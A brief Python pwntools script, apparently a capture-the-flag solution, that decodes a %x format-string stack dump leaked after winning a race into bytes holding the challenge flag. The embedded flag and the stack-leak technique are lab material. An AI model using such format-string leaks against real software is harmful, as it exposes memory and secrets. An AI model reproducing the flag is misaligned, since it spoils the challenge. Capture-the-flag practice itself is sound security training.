#!/usr/bin/env python3

from pwn import *

#format string vuln after winning the race.
#dump the stack with %x

output = "576bf1c0 170 56588dfa a 3 26 2 1 5658996c 576bf1c0 576bf340 7b425448 5f796877 5f643164 34735f31 745f3376 665f3368 5f67346c 745f6e30 355f3368 6b633474 7d213f 5c510b00 f7f743fc 5658bf8c ffa75fd8 56589441 1 ffa76084 ffa7608c 5c510b00 ffa75ff0 0"

decoded = b''

for word in output.split():
    decoded += p32( int(word, 16) )

print(decoded)
